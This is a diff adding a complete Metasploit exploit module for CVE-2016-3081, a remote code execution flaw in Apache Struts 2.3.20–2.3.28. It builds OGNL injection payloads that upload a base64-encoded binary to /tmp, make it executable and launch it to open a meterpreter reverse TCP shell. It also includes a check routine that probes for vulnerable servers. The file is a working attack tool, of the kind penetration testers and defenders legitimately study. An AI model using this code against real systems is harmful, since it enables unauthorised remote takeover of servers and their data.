@@ -1,0 +1,190 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Apache Struts Dynamic Method Invocation Remote Code Execution',
+      'Description'    => %q{
+        This module exploits a remote command execution vulnerability in Apache Struts
+        version between 2.3.20 and 2.3.28 (except 2.3.20.2 and 2.3.24.2). Remote Code
+        Execution can be performed via method: prefix when Dynamic Method Invocation
+        is enabled.
+      },
+      'Author'         => [ 'Nixawk' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2016-3081' ],
+          [ 'URL', 'https://www.seebug.org/vuldb/ssvid-91389' ]
+        ],
+      'Platform'       => %w{ linux },
+      'Privileged'     => true,
+      'DefaultOptions' => {
+        'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp_uuid'
+      },
+      'Targets'        =>
+        [
+          ['Linux Universal',
+            {
+              'Arch' => ARCH_X86,
+              'Platform' => 'linux'
+            }
+          ]
+        ],
+      'DisclosureDate' => 'Apr 27 2016',
+      'DefaultTarget' => 0))
+
+    register_options(
+      [
+        Opt::RPORT(8080),
+        OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/blank-struts2/login.action']),
+        OptString.new('TMPPATH', [ false, 'Overwrite the temp path for the file upload. Needed if the home directory is not writable.', nil])
+      ], self.class)
+  end
+
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+
+  def send_http_request(payload)
+    uri = normalize_uri(datastore['TARGETURI'])
+    res = send_request_cgi(
+      'uri'     => "#{uri}#{payload}",
+      'method'  => 'POST')
+    if res && res.code == 404
+      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')
+    end
+    res
+  end
+
+  def parameterize(params) # params is a hash
+    URI.escape(params.collect { |k, v| "#{k}=#{v}" }.join('&'))
+  end
+
+  def generate_rce_payload(code, params_hash)
+    payload = "?method:"
+    payload << Rex::Text.uri_encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS")
+    payload << ","
+    payload << Rex::Text.uri_encode(code)
+    payload << ","
+    payload << Rex::Text.uri_encode("1?#xx:#request.toString")
+    payload << "&"
+    payload << parameterize(params_hash)
+    payload
+  end
+
+  def temp_path
+    @TMPPATH ||= lambda {
+      path = datastore['TMPPATH']
+      return nil unless path
+      unless path.end_with?('/')
+        path << '/'
+      end
+      return path
+    }.call
+  end
+
+  def upload_file(filename, content)
+    var_a = rand_text_alpha_lower(4)
+    var_b = rand_text_alpha_lower(4)
+    var_c = rand_text_alpha_lower(4)
+    var_d = rand_text_alpha_lower(4)
+
+    code = "##{var_a}=new sun.misc.BASE64Decoder(),"
+    code << "##{var_b}=new java.io.FileOutputStream(new java.lang.String(##{var_a}.decodeBuffer(#parameters.#{var_c}[0]))),"
+    code << "##{var_b}.write(##{var_a}.decodeBuffer(#parameters.#{var_d}[0])),"
+    code << "##{var_b}.close()"
+
+    params_hash = { var_c => filename, var_d => content }
+    payload = generate_rce_payload(code, params_hash)
+
+    send_http_request(payload)
+  end
+
+  def execute_command(cmd)
+    var_a = rand_text_alpha_lower(4)
+    var_b = rand_text_alpha_lower(4)
+    var_c = rand_text_alpha_lower(4)
+    var_d = rand_text_alpha_lower(4)
+    var_e = rand_text_alpha_lower(4)
+    var_f = rand_text_alpha_lower(4)
+
+    code = "##{var_a}=@java.lang.Runtime@getRuntime().exec(#parameters.#{var_f}[0]).getInputStream(),"
+    code << "##{var_b}=new java.io.InputStreamReader(##{var_a}),"
+    code << "##{var_c}=new java.io.BufferedReader(##{var_b}),"
+    code << "##{var_d}=new char[1024],"
+    code << "##{var_c}.read(##{var_d}),"
+
+    code << "##{var_e}=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
+    code << "##{var_e}.println(##{var_d}),"
+    code << "##{var_e}.close()"
+
+    cmd.tr!(' ', '+') if cmd && cmd.include?(' ')
+    params_hash = { var_f => cmd }
+    payload = generate_rce_payload(code, params_hash)
+
+    send_http_request(payload)
+  end
+
+  def linux_stager
+    payload_exe = rand_text_alphanumeric(4 + rand(4))
+    path = temp_path || '/tmp/'
+    payload_exe = "#{path}#{payload_exe}"
+
+    b64_filename = Rex::Text.encode_base64(payload_exe)
+    b64_content = Rex::Text.encode_base64(generate_payload_exe)
+
+    print_status("Uploading exploit to #{payload_exe}")
+    upload_file(b64_filename, b64_content)
+
+    print_status("Attempting to execute the payload...")
+    execute_command("chmod 700 #{payload_exe}")
+    execute_command("/bin/sh -c #{payload_exe}")
+  end
+
+  def exploit
+    linux_stager
+  end
+
+  def check
+    var_a = rand_text_alpha_lower(4)
+    var_b = rand_text_alpha_lower(4)
+
+    addend_one = rand_text_numeric(rand(3) + 1).to_i
+    addend_two = rand_text_numeric(rand(3) + 1).to_i
+    sum = addend_one + addend_two
+    flag = Rex::Text.rand_text_alpha(5)
+
+    code = "##{var_a}=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),"
+    code << "##{var_a}.print(#parameters.#{var_b}[0]),"
+    code << "##{var_a}.print(new java.lang.Integer(#{addend_one}+#{addend_two})),"
+    code << "##{var_a}.print(#parameters.#{var_b}[0]),"
+    code << "##{var_a}.close()"
+
+    params_hash = { var_b => flag }
+    payload = generate_rce_payload(code, params_hash)
+
+    begin
+      resp = send_http_request(payload)
+    rescue Msf::Exploit::Failed
+      return Exploit::CheckCode::Unknown
+    end
+
+    if resp && resp.code == 200 && resp.body.include?("#{flag}#{sum}#{flag}")
+      Exploit::CheckCode::Vulnerable
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+end
